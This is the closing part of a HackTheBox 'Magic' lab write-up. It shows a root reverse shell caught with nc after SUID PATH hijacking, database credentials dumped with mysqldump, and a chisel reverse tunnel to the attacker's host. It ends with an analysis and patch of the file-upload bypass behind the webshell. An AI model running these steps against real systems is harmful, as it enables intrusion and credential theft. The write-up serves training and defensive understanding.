14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre> theseus@ubuntu:/tmp$ /bin/sysinfo

 # Kali
 ┌──(root💀kali)-[~/htb/magic]
 └─# nc -nvlp 4444
 Ncat: Version 7.92 ( https://nmap.org/ncat )
 Ncat: Listening on :::4444
 Ncat: Listening on 0.0.0.0:4444
 Ncat: Connection from 10.10.10.185.
 Ncat: Connection from 10.10.10.185:39526.
 bash: groups: command not found
 Command 'lesspipe' is available in the following places
  * /bin/lesspipe
  * /usr/bin/lesspipe
 The command could not be located because '/bin:/usr/bin' is not included in the PATH environment variable.
 lesspipe: command not found
 Command 'dircolors' is available in '/usr/bin/dircolors'
 The command could not be located because '/usr/bin' is not included in the PATH environment variable.
 dircolors: command not found
 root@ubuntu:/tmp#
</pre></table></code></div></div><li>Revert PATH environment<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> theseus@ubuntu:/tmp$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
</pre></table></code></div></div></ol><li>Demo - <code class="language-plaintext highlighter-rouge">sysinfo</code> PATH Hijacking <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Magic/images/kSYETSr4DC.gif" alt="" data-proofer-ignore></ol><h1 id="additional">Additional</h1><h2 id="theseus---obtain-creds-w-sqldump">Theseus - Obtain creds w/ SQLDump <a href="#theseus---obtain-creds-w-sqldump" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Instead of writing a <code class="language-plaintext highlighter-rouge">PHP</code> file to query <code class="language-plaintext highlighter-rouge">mysql</code>, we use <code class="language-plaintext highlighter-rouge">mysqldump</code> to dump <code class="language-plaintext highlighter-rouge">mysql</code> databases.<blockquote class="prompt-info"><div><p>The dump contains a set of SQL statements that can be executed to reproduce the original database object definitions and table data.</p></div></blockquote><li>On <code class="language-plaintext highlighter-rouge">www-data</code>, type <code class="language-plaintext highlighter-rouge">mysql</code> and hit <code class="language-plaintext highlighter-rouge">tab</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre> www-data@ubuntu:/tmp$ mysql
 mysql_config_editor        mysql_secure_installation  mysqladmin                 mysqld                     mysqldumpslow              mysqlrepair
 mysql_embedded             mysql_ssl_rsa_setup        mysqlanalyze               mysqld_multi               mysqlimport                mysqlreport
 mysql_install_db           mysql_tzinfo_to_sql        mysqlbinlog                mysqld_safe                mysqloptimize              mysqlshow
 mysql_plugin               mysql_upgrade              mysqlcheck                 mysqldump                  mysqlpump                  mysqlslap
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>A list of <code class="language-plaintext highlighter-rouge">mysql</code> commands is displayed</p></div></blockquote><li>Dump <code class="language-plaintext highlighter-rouge">Magic</code> database w/ <code class="language-plaintext highlighter-rouge">mysqldump</code><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre> <span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="o">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span> <span class="n">mysqldump</span> <span class="c1">--user=theseus --password=iamkingtheseus --host=localhost Magic</span>
	
 <span class="k">LOCK</span> <span class="n">TABLES</span> <span class="nv">`login`</span> <span class="k">WRITE</span><span class="p">;</span>
 <span class="cm">/*!40000 ALTER TABLE `login` DISABLE KEYS */</span><span class="p">;</span>
 <span class="k">INSERT</span> <span class="k">INTO</span> <span class="nv">`login`</span> <span class="k">VALUES</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s1">'admin'</span><span class="p">,</span><span class="s1">'Th3s3usW4sK1ng'</span><span class="p">);</span>
 <span class="cm">/*!40000 ALTER TABLE `login` ENABLE KEYS */</span><span class="p">;</span>
 <span class="n">UNLOCK</span> <span class="n">TABLES</span><span class="p">;</span>
 <span class="cm">/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */</span><span class="p">;</span>
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Magic/images/Pasted%20image%2020220927165334.png" alt="" data-proofer-ignore></p><ul><li><code class="language-plaintext highlighter-rouge">admin:Th3s3usW4sK1ng</code></ul></ol><h2 id="theseus---port-forward-to-access-mysql-on-kali">Theseus - Port Forward to access MySQL on Kali <a href="#theseus---port-forward-to-access-mysql-on-kali" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Instead of writing a <code class="language-plaintext highlighter-rouge">PHP</code> file to query <code class="language-plaintext highlighter-rouge">mysql</code>, we use access <code class="language-plaintext highlighter-rouge">mysql</code> on <code class="language-plaintext highlighter-rouge">kali</code> w/ <code class="language-plaintext highlighter-rouge">chisel</code><li>By using <code class="language-plaintext highlighter-rouge">chisel</code> to port forward, we are able to access <code class="language-plaintext highlighter-rouge">magic.htb</code> <code class="language-plaintext highlighter-rouge">mysql</code> server on <code class="language-plaintext highlighter-rouge">kali</code><li>Portwarding w/ <code class="language-plaintext highlighter-rouge">chisel</code><ul><li><code class="language-plaintext highlighter-rouge">kali</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>  ┌──(root💀kali)-[~/htb/magic]
  └─# chisel server --reverse --port 1337
  2022/09/27 15:44:16 server: Reverse tunnelling enabled
  2022/09/27 15:44:16 server: Fingerprint vnLX3w8MGxUv331CjE1Hmujl+mZimvFGhTgxXm3YNmc=
  2022/09/27 15:44:16 server: Listening on http://0.0.0.0:1337
</pre></table></code></div></div><li><code class="language-plaintext highlighter-rouge">magic.htb</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>  www-data@ubuntu:/tmp$ ./chisel client 10.10.14.14:1337 R:3306:127.0.0.1:3306 &amp;
  2022/09/27 00:44:39 client: Connecting to ws://10.10.14.14:1337
  2022/09/27 00:44:39 client: Connected (Latency 36.181644ms)
</pre></table></code></div></div></ul><li>Access <code class="language-plaintext highlighter-rouge">mysql</code> and query <code class="language-plaintext highlighter-rouge">Magic</code> database<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/magic]
 └─# mysql --user=theseus --password=iamkingtheseus --host=127.0.0.1 Magic
	
 MySQL [Magic]&gt; show tables;
 +-----------------+
 | Tables_in_Magic |
 +-----------------+
 | login           |
 +-----------------+
 1 row in set (0.036 sec)
	
 MySQL [Magic]&gt; SELECT * FROM login;
 +----+----------+----------------+
 | id | username | password       |
 +----+----------+----------------+
 |  1 | admin    | Th3s3usW4sK1ng |
 +----+----------+----------------+
 1 row in set (0.037 sec)
	
 MySQL [Magic]&gt;
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Magic/images/Pasted%20image%2020220927155345.png" alt="" data-proofer-ignore></p><ul><li><code class="language-plaintext highlighter-rouge">admin:Th3s3usW4sK1ng</code></ul></ol><h2 id="how-did-we-do-a-file-upload-bypass">How did we do a file upload bypass? <a href="#how-did-we-do-a-file-upload-bypass" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>View <code class="language-plaintext highlighter-rouge">upload.php</code><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre><td class="rouge-code"><pre> <span class="cp">&lt;?php</span>
 <span class="nv">$target_dir</span> <span class="o">=</span> <span class="s2">"images/uploads/"</span><span class="p">;</span>
 <span class="nv">$target_file</span> <span class="o">=</span> <span class="nv">$target_dir</span> <span class="mf">.</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"image"</span><span class="p">][</span><span class="s2">"name"</span><span class="p">]);</span>
 <span class="nv">$uploadOk</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
 <span class="nv">$allowed</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'2'</span><span class="p">,</span> <span class="s1">'3'</span><span class="p">);</span>
	
     <span class="nv">$imageFileType</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nb">pathinfo</span><span class="p">(</span><span class="nv">$target_file</span><span class="p">,</span> <span class="no">PATHINFO_EXTENSION</span><span class="p">));</span>
     <span class="k">if</span> <span class="p">(</span><span class="nv">$imageFileType</span> <span class="o">!=</span> <span class="s2">"jpg"</span> <span class="o">&amp;&amp;</span> <span class="nv">$imageFileType</span> <span class="o">!=</span> <span class="s2">"png"</span> <span class="o">&amp;&amp;</span> <span class="nv">$imageFileType</span> <span class="o">!=</span> <span class="s2">"jpeg"</span><span class="p">)</span> <span class="p">{</span>
         <span class="k">echo</span> <span class="s2">"&lt;script&gt;alert('Sorry, only JPG, JPEG &amp; PNG files are allowed.')&lt;/script&gt;"</span><span class="p">;</span>
         <span class="nv">$uploadOk</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
     <span class="p">}</span>
	
     <span class="k">if</span> <span class="p">(</span><span class="nv">$uploadOk</span> <span class="o">===</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
         <span class="c1">// Check if image is actually png or jpg using magic bytes</span>
         <span class="nv">$check</span> <span class="o">=</span> <span class="nb">exif_imagetype</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"image"</span><span class="p">][</span><span class="s2">"tmp_name"</span><span class="p">]);</span>
         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$check</span><span class="p">,</span> <span class="nv">$allowed</span><span class="p">))</span> <span class="p">{</span>
             <span class="k">echo</span> <span class="s2">"&lt;script&gt;alert('What are you trying to do there?')&lt;/script&gt;"</span><span class="p">;</span>
             <span class="nv">$uploadOk</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
         <span class="p">}</span>
     <span class="p">}</span>
         <span class="c1">//Check file contents</span>
         <span class="cm">/*$image = file_get_contents($_FILES["image"]["tmp_name"]);
         if (strpos($image, "&lt;?") !== FALSE) {
             echo "&lt;script&gt;alert('Detected \"\&lt;\?\". PHP is not allowed!')&lt;/script&gt;";
             $uploadOk = 0;
         }*/</span>
     <span class="k">if</span> <span class="p">(</span><span class="nv">$uploadOk</span> <span class="o">===</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
         <span class="k">if</span> <span class="p">(</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"image"</span><span class="p">][</span><span class="s2">"tmp_name"</span><span class="p">],</span> <span class="nv">$target_file</span><span class="p">))</span> <span class="p">{</span>
             <span class="k">echo</span> <span class="s2">"The file "</span> <span class="mf">.</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"image"</span><span class="p">][</span><span class="s2">"name"</span><span class="p">])</span> <span class="mf">.</span> <span class="s2">" has been uploaded."</span><span class="p">;</span>
         <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
             <span class="k">echo</span> <span class="s2">"Sorry, there was an error uploading your file."</span><span class="p">;</span>
         <span class="p">}</span>
     <span class="p">}</span>
 <span class="p">}</span>
 <span class="cp">?&gt;</span>
</pre></table></code></div></div><blockquote class="prompt-info"><div><ol><li>We managed to bypass the first check because we appended <code class="language-plaintext highlighter-rouge">.png</code>, tricking <code class="language-plaintext highlighter-rouge">pathinfo</code> into thinking our <code class="language-plaintext highlighter-rouge">.php</code> is part of the filename, <code class="language-plaintext highlighter-rouge">.png</code> is the extension. <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Magic/images/Pasted%20image%2020220927161506.png" alt="" data-proofer-ignore><li>Next, we managed to bypass the second check <code class="language-plaintext highlighter-rouge">exif_imagetype</code> by inserting our webshell payload in the middle of the image file, tricking <code class="language-plaintext highlighter-rouge">exif_imagetype</code> into thinking we uploaded a valid image - JPG (1), PNG(2). <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Magic/images/Pasted%20image%2020220927165452.png" alt="" data-proofer-ignore><li>The 3rd check (Commented) is recursively checking for <code class="language-plaintext highlighter-rouge">&lt;?</code>, however this causes many false positives because <code class="language-plaintext highlighter-rouge">&lt;?</code> could be in a valid image file.</ol></div></blockquote></ol><h2 id="why-was-phppng-processed--patch-vulnerability">Why was .php.png processed &amp; Patch Vulnerability <a href="#why-was-phppng-processed--patch-vulnerability" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>There is a <code class="language-plaintext highlighter-rouge">.htaccess</code> file residing in <code class="language-plaintext highlighter-rouge">/var/www/Magic</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre> www-data@ubuntu:/var/www/Magic$ cat .htaccess
 &lt;FilesMatch ".+\.ph(p([3457s]|\-s)?|t|tml)"&gt;
 SetHandler application/x-httpd-php
 &lt;/FilesMatch&gt;
 &lt;Files ~ "\.(sh|sql)"&gt;
    order deny,allow
    deny from all
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>It is telling the webserver to process files that contains the word <code class="language-plaintext highlighter-rouge">.php</code> as <code class="language-plaintext highlighter-rouge">PHP</code> files, causing our webshell to execute.</p></div></blockquote><li><code class="language-plaintext highlighter-rouge">.htaccess</code> supersedes configuration in <code class="language-plaintext highlighter-rouge">mods-enabled/php5.6.conf</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre> www-data@ubuntu:/var/www/Magic$ cat /etc/apache2/mods-available/php5.6.conf
 &lt;FilesMatch ".+\.ph(p[3457]?|t|tml)$"&gt;
     SetHandler application/x-httpd-php
 &lt;/FilesMatch&gt;
 &lt;FilesMatch ".+\.phps$"&gt;
     SetHandler application/x-httpd-php-source
     # Deny access to raw php sources by default
     # To re-enable it's recommended to enable access to the files
     # only in specific virtual host or directory
     Require all denied
 &lt;/FilesMatch&gt;
 # Deny access to files without filename (e.g. '.php')
 &lt;FilesMatch "^\.ph(p[3457]?|t|tml|ps)$"&gt;
     Require all denied
 &lt;/FilesMatch&gt;
	
 # Running PHP scripts in user directories is disabled by default
 #
 # To re-enable PHP in user directories comment the following lines
 # (from &lt;IfModule ...&gt; to &lt;/IfModule&gt;.) Do NOT set it to On as it
 # prevents .htaccess files from disabling it.
 &lt;IfModule mod_userdir.c&gt;
     &lt;Directory /home/*/public_html&gt;
         php_admin_flag engine Off
     &lt;/Directory&gt;
 &lt;/IfModule&gt;
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>The <code class="language-plaintext highlighter-rouge">$</code> (end of string) causes the webserver to only process files as <code class="language-plaintext highlighter-rouge">PHP</code> only if <code class="language-plaintext highlighter-rouge">.php</code> is at the end of the filename, meaning <code class="language-plaintext highlighter-rouge">.png.php</code> will not work.</p></div></blockquote><li>Lets remove <code class="language-plaintext highlighter-rouge">.htacess</code>, the server will process our webshell as an image<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> www-data@ubuntu:/var/www/Magic$ cp .htaccess htaccess.bak
 www-data@ubuntu:/var/www/Magic$ rm .htaccess
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Magic/images/Pasted%20image%2020220927165139.png" alt="" data-proofer-ignore></p></ol></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/hackthebox-linux/'>HackTheBox - Linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/exploit-file-upload-bypass/" class="post-tag no-text-decoration" >exploit/file-upload-bypass</a> <a href="/tags/linux-priv-esc-suid-path-hijacking/" class="post-tag no-text-decoration" >linux-priv-esc/suid/path-hijacking</a> <a href="/tags/pivot/" class="post-tag no-text-decoration" >pivot</a> <a href="/tags/exploit-sqli-auth-bypass/" class="post-tag no-text-decoration" >exploit/sqli/auth-bypass</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox - Magic - Yufong&amp;u=https://yufongg.github.io/posts/Magic/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="" data-toggle="tooltip" data-placement="top" title="" target="_blank" rel="noopener" aria-label=""> <i class="fa-fw "></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recent Update</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Blunder/">HackTheBox - Blunder</a><li><a href="/posts/Attacktive-Directory/">TryHackMe - Attacktive Directory</a><li><a href="/posts/Tommy-Boy-1/">Vulnhub - Tommy Boy 1</a><li><a href="/posts/Tiki-1/">Vulnhub - Tiki 1</a><li><a href="/posts/Breach-1/">Vulnhub - Breach 1</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tcp-80-http-web-app-cms-exploit/">tcp/80-http/web-app-cms-exploit</a> <a class="post-tag" href="/tags/linux-priv-esc-linux-creds-found/">linux-priv-esc/linux-creds-found</a> <a class="post-tag" href="/tags/exploit-file-inclusion-lfi/">exploit/file-inclusion/lfi</a> <a class="post-tag" href="/tags/linux-priv-esc-sudo-gtfo-bin/">linux-priv-esc/sudo/gtfo-bin</a> <a class="post-tag" href="/tags/exploit-command-injection/">exploit/command-injection</a> <a class="post-tag" href="/tags/linux-priv-esc-kernel-exploit/">linux-priv-esc/kernel-exploit</a> <a class="post-tag" href="/tags/cryptography/">cryptography</a> <a class="post-tag" href="/tags/exploit-sqli-database-enum/">exploit/sqli/database-enum</a> <a class="post-tag" href="/tags/pivot/">pivot</a> <a class="post-tag" href="/tags/exploit-file-upload-bypass/">exploit/file-upload-bypass</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/UpDown/"><div class="card-body"> <em class="timeago small" data-ts="1674403200" > 2023-01-23 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - UpDown</h3><div class="text-muted small"><p> Overview This machine begins w/ a web enumeration, /dev/.git is discovered, since .git is found, we are able to view the logs and commits of the git repository, providing us w/ the header needed to...</p></div></div></a></div><div class="card"> <a href="/posts/OpenSource/"><div class="card-body"> <em class="timeago small" data-ts="1655827200" > 2022-06-22 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - OpenSource</h3><div class="text-muted small"><p> Overview This machine is hosting a webpage that allows user to test a file upload web application and download its source code. However, the source code is archived together with a directory .git, ...</p></div></div></a></div><div class="card"> <a href="/posts/Trick/"><div class="card-body"> <em class="timeago small" data-ts="1659196800" > 2022-07-31 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Trick</h3><div class="text-muted small"><p> Overview This machine begins w/ DNS enumeration, revealing a subdomain preprod-payroll.trick.htb that running a recruitment management system via nginx. The recruitment management system is suscept...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/OpenAdmin/" class="btn btn-outline-primary" prompt="Older"><p>HackTheBox - OpenAdmin</p></a> <a href="/posts/Admirer/" class="btn btn-outline-primary" prompt="Newer"><p>HackTheBox - Admirer</p></a></div><div id="disqus_thread" class="pt-2 pb-2"><p class="text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script type="text/javascript"> var disqus_config = function () { this.page.url = 'https://yufongg.github.io/posts/Magic/'; this.page.identifier = '/posts/Magic/'; }; /* Lazy loading */ var disqus_observer = new IntersectionObserver(function (entries) { if(entries[0].isIntersecting) { (function () { var d = document, s = d.createElement('script'); s.src = 'https://yufongg-github-io.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); disqus_observer.disconnect(); } }, { threshold: [0] }); disqus_observer.observe(document.querySelector('#disqus_thread')); /* Auto switch theme */ function reloadDisqus() { /* Disqus hasn't been loaded */ if (typeof DISQUS === "undefined") { return; } if (document.readyState == 'complete') { DISQUS.reset({ reload: true, config: disqus_config }); } } const modeToggle = document.querySelector(".mode-toggle"); if (typeof modeToggle !== "undefined") { /* modeToggle.addEventListener('click', reloadDisqus); // not pretty for 'color-scheme' */ window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', reloadDisqus); } </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://github.com/yufongg">yufongg</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tcp-80-http-web-app-cms-exploit/">tcp/80-http/web-app-cms-exploit</a> <a class="post-tag" href="/tags/linux-priv-esc-linux-creds-found/">linux-priv-esc/linux-creds-found</a> <a class="post-tag" href="/tags/exploit-file-inclusion-lfi/">exploit/file-inclusion/lfi</a> <a class="post-tag" href="/tags/linux-priv-esc-sudo-gtfo-bin/">linux-priv-esc/sudo/gtfo-bin</a> <a class="post-tag" href="/tags/exploit-command-injection/">exploit/command-injection</a> <a class="post-tag" href="/tags/linux-priv-esc-kernel-exploit/">linux-priv-esc/kernel-exploit</a> <a class="post-tag" href="/tags/cryptography/">cryptography</a> <a class="post-tag" href="/tags/exploit-sqli-database-enum/">exploit/sqli/database-enum</a> <a class="post-tag" href="/tags/pivot/">pivot</a> <a class="post-tag" href="/tags/exploit-file-upload-bypass/">exploit/file-upload-bypass</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-LS5TVPBBZE"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-LS5TVPBBZE'); }); </script>
